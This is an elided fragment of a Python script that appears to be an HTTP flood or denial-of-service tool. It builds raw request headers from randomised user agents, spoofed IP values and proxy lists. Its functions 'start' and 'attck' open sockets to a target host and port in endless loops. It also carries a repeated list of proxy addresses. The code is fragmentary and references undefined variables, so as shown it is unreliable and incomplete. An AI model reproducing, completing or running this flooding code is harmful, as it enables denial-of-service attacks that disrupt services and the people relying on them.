...
useragent2 = ["""168.27.5.21:80 172.156.27.46:443
168.27.5.21:80 172.156.27.46:443
168.27.5.21:80 172.156.27.46:443
168.27.5.21:80 172.156.27.46:443
168.27.5.21:80 172.156.27.46:443
168.27.5.21:80 172.156.27.46:443
...
def start():
  ...
  main_req = ipser  + sockall + lolall + nolakall + agentall + content + length + accept + target_host + "\r\n"
  while True:
        try:
...
def attck():
  ...
  content = "Content-Type: application/x-www-form-urlencoded"+"\r\n"
  length  = "Content-Length: 0 \r\nConnection: Keep-Alive\r\n"
  lolanjg = "refall"+random.choice(useragents)+random.choice(userip)+random.choice(socks5)+str(ip)+"\r\n"
  main_lol = anjgall + lolanjg + userkau + content + length + "\r\n"
  while True:
        try:
            s = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
            s.connect((str(ip),int(port)))
